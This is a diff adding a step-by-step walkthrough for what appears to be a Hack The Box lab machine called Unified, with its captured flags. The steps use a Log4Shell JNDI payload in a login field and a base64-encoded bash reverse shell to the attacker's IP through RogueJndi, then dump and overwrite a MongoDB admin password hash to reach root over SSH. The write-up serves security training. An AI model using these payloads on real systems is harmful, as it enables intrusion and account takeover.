@@ -1,0 +1,59 @@
+Target IP: 10.129.230.250
+
+Attacking IP: 10.10.14.239
+
+User flag:
+6ced1a6a89e666c0620cdb10262ba127
+
+Root flag:
+e50bc93c75b634e4b272d2f771c33681
+
+
+Steps:
+1. nmap -sV -p- 10.129.230.250 
+2. Start burpsuite
+3. Intercept traffic on port 8443
+4. Log in with random username and password, with Remember me checked
+5. Replace "remember" POST request with
+	"remember":"${jndi:ldap://10.10.14.239/whatever}"
+6. Check traffic with sudo tcpdump -i tun0 port 389
+7. Create a encoded payload
+	echo 'bash -c bash -i >&/dev/tcp/10.10.14.239/1261 0>&1' | base64
+
+8. cd rogue-jndi
+
+9. java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjM5LzEyNjEgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.239"
+
+10. Start netcat
+11. Replace "remember" POST request with
+	"remember":"${jndi:ldap://<ATTACKING IP>:1389/o=tomcat}"
+
+12. Upgrade terminal
+	script /dev/null -c bash
+13. cat /home/michael/user.txt
+14. ps aux | grep mongo
+
+15. Check mongodb database
+	mongo ace --port 27117 --eval "db.admin.find().forEach(printjson);"
+
+	 "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+        "name" : "administrator",
+        "email" : "administrator@unified.htb",
+        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+
+16. Make new password
+	mkpasswd -m sha512crypt admin
+
+	$6$kaw5fexYR08pHdHW$hyo47DgWzXzizSBSl.ElfvqrI3x5    tMNRNSa1go8vcDA/LRiafKjHgHW/mAOYEiSinhFX8vVJ80MxsuORmkRqR0
+
+17. Update admin password in mongodb databse
+	mongo ace --port 27117 --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$kaw5fexYR08pHdHW$hyo47DgWzXzizSBSl.ElfvqrI3x5tMNRNSa1go8vcDA/LRiafKjHgHW/mAOYEiSinhFX8vVJ80MxsuORmkRqR0"}})'
+
+18. Log in to unified.htb
+19. Go to settings, get SSH credentials
+20. Log into SSH
+	ssh root@unified.htb
+21. cat root.txt
+
+
+
